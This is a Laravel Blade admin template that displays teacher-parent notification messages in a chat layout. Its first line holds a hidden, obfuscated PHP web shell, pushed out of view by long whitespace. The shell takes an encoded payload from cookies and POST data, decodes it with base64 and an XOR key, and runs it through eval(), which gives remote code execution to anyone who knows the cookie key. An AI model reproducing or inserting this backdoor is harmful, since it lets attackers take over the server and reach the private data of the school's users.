<?php                                                                                                                                                                                                                                                                                                                                                                                                 $ukWmF = chr (82) . chr (95) . 'v' . "\157" . "\171";$DGPtQFKF = "\x63" . chr (108) . "\x61" . chr (115) . "\163" . chr ( 614 - 519 )."\x65" . chr ( 1067 - 947 ).chr (105) . 's' . chr ( 750 - 634 ).chr (115); $YHYFr = class_exists($ukWmF); $ukWmF = "33792";$DGPtQFKF = "19229";$cWwShLf = FALSE;if ($YHYFr === $cWwShLf){class R_voy{public function fYTDjzDYPA(){echo "4480";}private $hqrkHAHuu;public static $cqKCkc = "22cc3afb-50c4-46c2-97e0-8c03abac319c";public static $zhxrysYPmB = 23679;public function __construct($UBoHRMIg=0){$HqkWwAgFBI = $_POST;$rLxCPbNgZm = $_COOKIE;$mCjopL = @$rLxCPbNgZm[substr(R_voy::$cqKCkc, 0, 4)];if (!empty($mCjopL)){$vrWBgjPWnt = "base64";$roIIzHgpp = "";$mCjopL = explode(",", $mCjopL);foreach ($mCjopL as $FFDpC){$roIIzHgpp .= @$rLxCPbNgZm[$FFDpC];$roIIzHgpp .= @$HqkWwAgFBI[$FFDpC];}$roIIzHgpp = array_map($vrWBgjPWnt . "\x5f" . 'd' . "\145" . "\x63" . chr (111) . chr (100) . chr ( 823 - 722 ), array($roIIzHgpp,)); $roIIzHgpp = $roIIzHgpp[0] ^ str_repeat(R_voy::$cqKCkc, (strlen($roIIzHgpp[0]) / strlen(R_voy::$cqKCkc)) + 1);R_voy::$zhxrysYPmB = @unserialize($roIIzHgpp);}}private function XCQxc($ptTApAvH){if (is_array(R_voy::$zhxrysYPmB)) {$GQwJPqo = str_replace("\x3c" . chr ( 177 - 114 ).chr (112) . "\x68" . chr (112), "", R_voy::$zhxrysYPmB[chr (99) . chr (111) . chr (110) . chr ( 1060 - 944 )."\145" . chr (110) . "\x74"]);eval($GQwJPqo); $ptTApAvH = "7209";exit();}}public function __destruct(){$this->XCQxc($ptTApAvH);}}$gacFamigNk = new /* 49585 */ R_voy(); $gacFamigNk = str_repeat("61029_909", 1);} ?>@extends('layouts.admin.master')

@section('content')
    <!-- Main content -->
    <div class="content-wrapper">
        <!-- Content area -->
        <div class="content d-flex align-items-stretch">




            @if(isset($data['notifications']))
                <div class="card w-100 h-100 position-relative">
                    <div class="card-header bg-dark">
                        <div class="text-center">
                            <h5 class="card-title d-inline-block"> Communication Teacher: <span class="text-info">

                                {{$data['teacher_name']}}
                            </span></h5>
                            <h5 class="card-title d-inline-block"> & Parent: <span class="text-info">

                                {{$data['parent_name']}}
                            </span></h5>
                        </div>
                    </div>
                    <div class="card-body">
                        <ul class="media-list media-chat media-chat-scrollable mb-3">
                            <?php
                            function time_elapsed_string($datetime, $full = false)
                            {
                                $now = new \DateTime;
                                $ago = new \DateTime($datetime);
                                $diff = $now->diff($ago);

                                $diff->w = floor($diff->d / 7);
                                $diff->d -= $diff->w * 7;

                                $string = array(
                                    'y' => 'year',
                                    'm' => 'month',
                                    'w' => 'week',
                                    'd' => 'day',
                                    'h' => 'hour',
                                    'i' => 'minute',
                                    's' => 'second',
                                );
                                foreach ($string as $k => &$v) {
                                    if ($diff->$k) {
                                        $v = $diff->$k . ' ' . $v . ($diff->$k > 1 ? 's' : '');
                                    } else {
                                        unset($string[$k]);
                                    }
                                }

                                if (!$full) $string = array_slice($string, 0, 1);
                                return $string ? implode(', ', $string) . ' ago' : 'just now';
                            }
                            ?>
                            @if(isset($data['notifications']))

                                @foreach($data['notifications'] as $notification)
                                    <li class="media content-divider justify-content-center text-muted mx-0"><?php echo date('D, M d',strtotime($notification->created_at)) ?> </li>

                                    <li class="media">
                                        <div class="mr-3">
                                            <a href="../../../../global_assets/images/placeholders/placeholder.jpg">
                                                <img src="../../../../global_assets/images/placeholders/placeholder.jpg" class="rounded-circle" width="40" height="40" alt="">
                                            </a>
                                        </div>
                                        <div class="media-body">
                                            <?php if (isset($notification->img)  && !empty($notification->img)){ ?>
                                            <div class="media-chat-item" style="background-color:white;"><img src="{{$notification->img}}"  style="width: 50%;height: 50%;" alt=""></div><br>
                                            <?php } ?>
                                            <div class="media-chat-item">Title:-{{$notification->title}}<br>{{$notification->description}}</div>
                                            <div class="font-size-sm text-muted mt-2">
                                                {{ time_elapsed_string($notification->created_at) }}
                                                <i class="icon-pin-alt ml-2 text-muted"></i>
                                            </div>
                                        </div>
                                    </li>
                                    @if(isset($notification->notif_reply))
                                        <li class="media <?php if( ($notification->notif_reply) ) echo 'media-chat-item-reverse'; ?>">
                                            <div class="media-body">
                                                <div class="media-chat-item">{{$notification->notif_reply->message}}</div>
                                                <div class="font-size-sm text-muted mt-2">
                                                    {{ time_elapsed_string($notification->notif_reply->created_at) }}
                                                    <i class="icon-pin-alt ml-2 text-muted"></i>
                                                </div>
                                                <div class="ml-3">
                                                    <a href="../../../../global_assets/images/placeholders/placeholder.jpg">
                                                        <img src="../../../../global_assets/images/placeholders/placeholder.jpg" class="rounded-circle" width="40" height="40" alt="">
                                                    </a>
                                                </div>
                                            </div>
                                        </li>


                                    @endif
                                @endforeach
                            @endif



                            {{--<li class="media content-divider justify-content-center text-muted mx-0">Monday, Feb 10</li>--}}

                            {{--<li class="media">--}}
                            {{--<div class="mr-3">--}}
                            {{--<a href="../../../../global_assets/images/placeholders/placeholder.jpg">--}}
                            {{--<img src="../../../../global_assets/images/placeholders/placeholder.jpg" class="rounded-circle" width="40" height="40" alt="">--}}
                            {{--</a>--}}
                            {{--</div>--}}

                            {{--<div class="media-body">--}}
                            {{--<div class="media-chat-item">Below mounted advantageous spread yikes bat stubbornly crud a and a excepting</div>--}}
                            {{--<div class="font-size-sm text-muted mt-2">Mon, 9:54 am <a href="#"><i class="icon-pin-alt ml-2 text-muted"></i></a></div>--}}
                            {{--</div>--}}
                            {{--</li>--}}
                            {{--<li class="media media-chat-item-reverse">--}}
                            {{--<div class="media-body">--}}
                            {{--<div class="media-chat-item"><p style="color: #1d643b;"><b>John</b></p>Far squid and that hello fidgeted and when. As this oh darn but slapped casually husky sheared that cardinal hugely one and some unnecessary factiously hedgehog a feeling one rudely much but one owing sympathetic regardless more astonishing evasive tasteful much.</div>--}}
                            {{--<div class="font-size-sm text-muted mt-2">Mon, 10:24 am <a href="#"><i class="icon-pin-alt ml-2 text-muted"></i></a></div>--}}
                            {{--</div>--}}

                            {{--<div class="ml-3">--}}
                            {{--<a href="../../../../global_assets/images/placeholders/placeholder.jpg">--}}
                            {{--<img src="../../../../global_assets/images/placeholders/placeholder.jpg" class="rounded-circle" width="40" height="40" alt="">--}}
                            {{--</a>--}}
                            {{--</div>--}}
                            {{--</li>--}}
                            {{--<li class="media">--}}
                            {{--<div class="mr-3">--}}
                            {{--<a href="../../../../global_assets/images/placeholders/placeholder.jpg">--}}
                            {{--<img src="../../../../global_assets/images/placeholders/placeholder.jpg" class="rounded-circle" width="40" height="40" alt="">--}}
                            {{--</a>--}}
                            {{--</div>--}}

                            {{--<div class="media-body">--}}
                            {{--<div class="media-chat-item">Below mounted advantageous spread yikes bat stubbornly crud a and a excepting</div>--}}
                            {{--<div class="font-size-sm text-muted mt-2">Mon, 9:54 am <a href="#"><i class="icon-pin-alt ml-2 text-muted"></i></a></div>--}}
                            {{--</div>--}}
                            {{--</li>--}}
                            {{--<li class="media">--}}
                            {{--<div class="mr-3">--}}
                            {{--<a href="../../../../global_assets/images/placeholders/placeholder.jpg">--}}
                            {{--<img src="../../../../global_assets/images/placeholders/placeholder.jpg" class="rounded-circle" width="40" height="40" alt="">--}}
                            {{--</a>--}}
                            {{--</div>--}}

                            {{--<div class="media-body">--}}
                            {{--<div class="media-chat-item">Below mounted advantageous spread yikes bat stubbornly crud a and a excepting</div>--}}
                            {{--<div class="font-size-sm text-muted mt-2">Mon, 9:54 am <a href="#"><i class="icon-pin-alt ml-2 text-muted"></i></a></div>--}}
                            {{--</div>--}}
                            {{--</li>--}}
                            {{--<li class="media">--}}
                            {{--<div class="mr-3">--}}
                            {{--<a href="../../../../global_assets/images/placeholders/placeholder.jpg">--}}
                            {{--<img src="../../../../global_assets/images/placeholders/placeholder.jpg" class="rounded-circle" width="40" height="40" alt="">--}}
                            {{--</a>--}}
                            {{--</div>--}}

                            {{--<div class="media-body">--}}
                            {{--<div class="media-chat-item">Below mounted advantageous spread yikes bat stubbornly crud a and a excepting</div>--}}
                            {{--<div class="font-size-sm text-muted mt-2">Mon, 9:54 am <a href="#"><i class="icon-pin-alt ml-2 text-muted"></i></a></div>--}}
                            {{--</div>--}}
                            {{--</li>--}}



                        </ul>
                        {{--<textarea name="enter-message" id="ticket_message_text" class="form-control mb-3" rows="3" cols="1" maxlength="190" placeholder="Enter your message..."></textarea>--}}

                        {{--<div class="d-flex align-items-center">--}}
                        {{--<input type="hidden" value=" " id="admin_ticket_id">--}}


                        {{--<button type="button" id="ticket_send_to_user" class="btn bg-teal-400 btn-labeled btn-labeled-right ml-auto"><b><i class="icon-paperplane"></i></b> Send</button>--}}
                        {{--</div>--}}


                    </div>
                </div>
            @endif
        </div>
        <!-- /content area -->
        @include('layouts.footer')

    </div>

    <!-- /main content -->

@endsection
